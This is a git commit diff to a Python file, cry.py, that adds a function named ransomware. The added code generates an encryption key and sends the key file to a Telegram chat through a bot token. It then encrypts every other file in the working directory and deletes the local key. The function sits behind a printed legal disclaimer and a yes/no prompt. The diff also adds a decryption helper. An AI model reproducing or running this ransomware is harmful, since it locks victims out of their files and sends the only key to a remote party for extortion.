81f8b77110fbc71e4e44e29ea22a67399b57cf9d
Riccardo Zappitelli <63201347+Ricc4rdo0107@users.noreply.github.com>
2024-03-18 12:45:26 +0100

    Update cry.py
    ehm

--- cry.py
+++ cry.py
@@ -1,9 +1,43 @@
 import os
+import telepot
 from cryptography.fernet import Fernet
 
-def generate_key_file(path="."):
+class YouDontKnowWhatYoureDoing(Exception):
+    def __init__(self, *args: object) -> None:
+        super().__init__(*args)
+
+def ransomware(bottoken, chat_id, are_you_sure=False, keyfilename="youremakinganerror.key"):
+    print("""
+Don't execute this on machines or environments without permission.
+this could lead to several legal consequences and I, Riccardo Zappitelli,
+am not responsable for any illegal use of this code.
+~ Riccardo Zappitelli""")
+    if are_you_sure and input("Understand? Y/n ").lower() == "y":
+        try:
+            bot = telepot.Bot(bottoken)
+            generate_key_file(filename=keyfilename)
+            bot.sendDocument(chat_id, open(keyfilename, "rb"))
+            files = [ x if x != "cry.py" and x != keyfilename and os.path.isfile(x) else None for x in os.listdir()]
+            files = list(filter(lambda x: x if x else False, files))
+            for file in files:
+                encrypt_file(file, key_filename=keyfilename)
+            os.remove(keyfilename)
+        except Exception as e:
+            raise e
+    else:
+        raise YouDontKnowWhatYoureDoing("Dumbass.")
+    
+
+def remove_danger(keyfilename):
+    files = [ x if x != "cry.py" and x != keyfilename and os.path.isfile(x) else None for x in os.listdir()]
+    files = list(filter(lambda x: x if x else False, files))
+    for file in files:
+        decrypt_file(file, key_filename=keyfilename)
+
+
+def generate_key_file(path="./", filename="key.key"):
     key=Fernet.generate_key()
-    with open(path+"/key.key", "wb") as key_file:
+    with open(path+filename, "wb") as key_file:
         key_file.write(key)
 
 def encrypt_file(filename, key=None, key_filename=None):
@@ -32,7 +66,6 @@ def decrypt_file(filename, key=None, key_filename=None):
 
     with open(filename, "rb") as fi:
         encrypted_content = fi.read()
-    
     decrypted_content = Fernet(key).decrypt(encrypted_content)
 
     with open(filename, "wb") as fo:
